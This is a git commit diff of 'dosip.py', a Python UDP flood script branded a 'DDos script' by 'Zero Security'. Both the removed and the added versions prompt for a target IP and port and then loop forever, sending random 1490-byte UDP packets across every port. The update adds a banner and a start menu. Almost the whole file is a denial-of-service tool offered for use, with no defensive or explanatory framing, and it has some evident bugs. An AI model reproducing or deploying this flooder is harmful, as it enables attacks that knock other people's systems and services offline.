cc709242c959d0d9d0fef10649aff941cd8d53f1
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-04 12:49:41 +0300

    Update dosip.py

--- dosip.py
+++ dosip.py
@@ -1,21 +1,3 @@
-import sys
-import os
-import time
-import socket
-import random
-import colorama
-# Reset
-Color_Off="\[\033[0m\]"       # Text Reset
-# Regular Colors
-Black="\[\033[0;30m\]"        # Black
-Red="\[\033[0;31m\]"          # Red
-Green="\[\033[0;32m\]"        # Green
-Yellow="\[\033[0;33m\]"       # Yellow
-Blue="\[\033[0;34m\]"         # Blue
-Purple="\[\033[0;35m\]"       # Purple
-Cyan="\[\033[0;36m\]"         # Cyan
-White="\[\033[0;37m\]"        # White
-#Requests
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -25,39 +7,54 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+# Zero Security
+from colorama import Fore, Back, Style
+import sys
+import os
+import time
+import socket
+import random
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
+
+run = os.system
+
+run("clear")
+print (Fore.GREEN + """
+ _____                ____                       _ _         
+|__  /___ _ __ ___   / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
+  / // _ \ '__/ _ \  \___ \ / _ \/ __| | | | '__| | __| | | |
+ / /|  __/ | | (_) |  ___) |  __/ (__| |_| | |  | | |_| |_| |
+/____\___|_|  \___/  |____/ \___|\___|\__,_|_|  |_|\__|\__, |
+ =DDos script=                                                      |___/ 
+
+""")
+
 os.system("clear")
 print(Blue + f"З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
-print("=============")
 print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")
-print("=DDos script=")
-ip = (raw_input("IP Target ════>")
-port = (input("Port  ════>")
-os.system("clear")
-os.system("figlet Attack Starting")
-print ("[                   ] 0% ")
-time.sleep(3)
-print ("[=====              ] 25%")
-time.sleep(3)
-print ("[==========         ] 50%")
-time.sleep(3)
-print ("[===============    ] 75%")
-time.sleep(3)
-print ("[===================] 100%")
-time.sleep(2)
-os.system("clear")
-time.sleep(2)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print( "Sent %s packet to %s throught port:%s"%(sent,ip,port) )
-     if port == 65534:
-       port = 1
-Footer
+
+print (Fore.RED + "[1] > Start Attack\n\n[2] > Close")
+data = raw_input("\n\n>>> Enter ( 1 - 2 ) > ")
+if data == "1":
+
+    ip = raw_input("\n\n>>> Enter Target IP => ")
+    port = input("\n\n>>> Enter Port (Default 80) => ")
+    print (Fore.BLUE + "\n\nPls Wait...\n\n")
+    time.sleep(4)
+    sent = 0
+    while True:
+
+        sock.sendto(bytes, (ip,port))
+        sent = sent + 1
+        port = port + 1
+        print (Fore.RED + "=> Sent %s Packet To %s Throught Port > %s <"%(sent,ip,port))
+        if port == 65534:
+            port = 1
+
+elif data == "2":
+    run("exit()")
+    run("clear")
